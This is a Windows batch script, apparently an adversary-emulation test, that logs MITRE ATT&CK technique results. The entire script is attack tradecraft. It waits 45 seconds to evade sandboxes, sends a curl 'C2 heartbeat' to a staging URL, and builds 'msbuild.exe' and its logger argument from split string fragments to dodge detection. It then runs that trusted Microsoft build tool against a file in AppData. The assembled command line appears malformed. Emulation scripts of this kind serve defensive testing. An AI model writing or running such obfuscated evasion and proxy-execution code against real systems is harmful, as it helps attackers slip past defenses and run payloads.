@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET txisnba=%APPDATA%\8240\91597f9f
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8240-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=control.txt
SET dvhhyc=8240

REM Debug logging setup
SET logfile=%APPDATA%\!rrocubc!\macula-simulations.log
SET agentname=!jwcnifl!

REM Obfuscated LOLBIN references (msbuild.exe)
SET qwzxc=m
SET mnbvf=sb
SET kloiu=u
SET pqwmn=ild
SET vbnmj=.e
SET zxcds=xe
SET fullbin=!qwzxc!!mnbvf!!kloiu!!pqwmn!!vbnmj!!zxcds!

REM Obfuscated command components
SET argpart1=/l
SET argpart2=ogger
SET argpart3=:Log
SET argpart4=gerEnt
SET argpart5=ry,
SET argpart6=;MyP
SET argpart7=aramet
SET argpart8=ers, 
SET argpart9=Foo

REM Build full logger argument via nested references
SET ref1=argpart1
SET ref2=argpart2
SET ref3=argpart3
SET ref4=argpart4
SET ref5=argpart5
SET ref6=argpart6
SET ref7=argpart7
SET ref8=argpart8
SET ref9=argpart9

SET loggerarg=
FOR /L %%i IN (1,1,9) DO (
    SET currentref=ref%%i
    CALL SET loggerarg=!loggerarg!%%!currentref!%%
)

REM Initial sandbox evasion delay (45 seconds)
echo [%DATE% %TIME%][DEBUG][!agentname!]: initial_delay_start=45s>> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: initial_delay_complete>> "!logfile!" 2>nul

REM C2 Heartbeat (first operation)
echo [%DATE% %TIME%][DEBUG][!agentname!]: heartbeat_start=!keghkgto!>> "!logfile!" 2>nul
SET curlbin=cur
SET curlpart2=l
SET fullcurl=!curlbin!!curlpart2!

CALL SET heartbeat=!keghkgto!
!fullcurl! -k -s -o nul "!heartbeat!"
IF !ERRORLEVEL! EQU 0 (
    SET hb_result=1
    SET hb_error=
) ELSE (
    SET hb_result=0
    SET hb_error=connection_failed
)
echo [%DATE% %TIME%][DEBUG][!agentname!]: heartbeat_complete=!hb_result!>> "!logfile!" 2>nul

REM TTP logging: T1218 (Trusted Developer Utilities)
SET ttp_id=T1218
SET ttp_name=Trusted_Developer_Utilities
SET year=%DATE:~10,4%
SET month=%DATE:~4,2%
SET day=%DATE:~7,2%
SET hour=%TIME:~0,2%
IF "!hour:~0,1!"==" " SET hour=0!hour:~1!
SET minute=%TIME:~3,2%
SET second=%TIME:~6,2%
SET millisecond=%TIME:~9,3%
SET ttp_timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.!millisecond!

echo [!ttp_timestamp!][!agentname!]: !rrocubc!-!dvhhyc!-!ttp_id!|!ttp_name!=!hb_result!:!hb_error!>> "!logfile!" 2>nul

REM Random delay (10-30 seconds)
echo [%DATE% %TIME%][DEBUG][!agentname!]: random_delay_start>> "!logfile!" 2>nul
SET /A rdelay=!RANDOM! %% 20 + 10
timeout /t !rdelay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: random_delay_complete=!rdelay!s>> "!logfile!" 2>nul

REM Build DLL path using PHR_ variables
SET dllpath=!txisnba!\!xzanpex!
echo [%DATE% %TIME%][DEBUG][!agentname!]: target_dll_path=!dllpath!>> "!logfile!" 2>nul

REM Execute msbuild with obfuscated command line
echo [%DATE% %TIME%][DEBUG][!agentname!]: lolbin_execution_start=!fullbin!>> "!logfile!" 2>nul

REM Build the complete command via multiple indirection layers
SET cmdpart1=!fullbin!
SET cmdpart2= !loggerarg!
SET cmdpart3=!dllpath!
SET cmdbase=!cmdpart1!!cmdpart2!!cmdpart3!

REM Final execution with error handling
!cmdbase!
IF !ERRORLEVEL! EQU 0 (
    SET exe_result=1
    SET exe_error=
    echo [%DATE% %TIME%][DEBUG][!agentname!]: lolbin_execution_success>> "!logfile!" 2>nul
) ELSE (
    SET exe_result=0
    SET exe_error=process_failed
    echo [%DATE% %TIME%][DEBUG][!agentname!]: lolbin_execution_failed=!ERRORLEVEL!>> "!logfile!" 2>nul
)

REM TTP logging: msbuild execution result
SET year=%DATE:~10,4%
SET month=%DATE:~4,2%
SET day=%DATE:~7,2%
SET hour=%TIME:~0,2%
IF "!hour:~0,1!"==" " SET hour=0!hour:~1!
SET minute=%TIME:~3,2%
SET second=%TIME:~6,2%
SET millisecond=%TIME:~9,3%
SET ttp_timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.!millisecond!

echo [!ttp_timestamp!][!agentname!]: !rrocubc!-!dvhhyc!-!ttp_id!|!ttp_name!=!exe_result!:!exe_error!>> "!logfile!" 2>nul

REM Final delay before exit (15 seconds)
echo [%DATE% %TIME%][DEBUG][!agentname!]: cleanup_delay_start=15s>> "!logfile!" 2>nul
ping -n 15 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: script_complete>> "!logfile!" 2>nul

ENDLOCAL